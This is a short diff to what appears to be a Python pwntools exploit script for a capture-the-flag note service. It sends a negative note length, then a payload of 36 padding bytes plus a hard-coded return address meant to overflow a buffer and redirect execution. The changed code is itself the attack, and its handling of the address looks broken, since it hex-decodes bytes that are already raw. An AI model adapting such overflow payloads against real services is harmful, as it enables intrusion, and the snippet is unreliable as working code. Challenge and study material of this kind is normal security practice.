@@ -19,6 +19,9 @@ rem.sendline('1')
 recv_data = rem.recvuntil('Input new note length: ',drop = False)
 rem.sendline('-1')
 #############################################################
-magic1_addr = "\xe0\x89\x04\x08"
+malicious_str = "\xe0\x89\x04\x08".decode("hex")
+print('malicious_str is ', malicious_str)
+magic1_addr = ("A" * 36 ) + malicious_str
+rem.sendline(magic1_addr)
 # rem.interactive()
 # rem.send('-1\r\n')
